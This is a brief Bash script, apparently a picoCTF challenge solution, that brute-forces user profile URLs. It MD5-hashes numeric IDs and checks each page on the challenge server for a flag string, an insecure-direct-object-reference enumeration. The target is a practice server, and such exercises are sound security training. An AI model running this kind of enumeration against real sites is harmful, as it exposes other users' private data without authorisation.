#!/bin/bash

TARGET_BASE="http://crystal-peak.picoctf.net:52311/profile/user"

echo "Starting Brute Force..."
echo "--------------------------"

for i in {3000..3020}
do
    # Generate MD5 hash dari angka (tanpa newline)
    HASH=$(echo -n $i | md5sum | awk '{print $1}')

    URL="${TARGET_BASE}/${HASH}"

    echo -n "Checking ID $i ($HASH): "

    # Curl dengan --silent supaya gak berisik,
    # --max-time biar gak kelamaan nunggu kalau koneksi ampas
    RESPONSE=$(curl -s "$URL")

    # Kamu bisa filter outputnya, misalnya cari kata "picoCTF{"
    if [[ $RESPONSE == *"picoCTF{"* ]]; then
        echo -e "\n\n[!] FLAG FOUND at ID $i!"
        echo "$RESPONSE" | grep -o "picoCTF{[^}]*}"
        exit 0
    else
        echo "Not found."
    fi
done

echo "--------------------------"
echo "Done, bre. Gak ada flag di range itu."
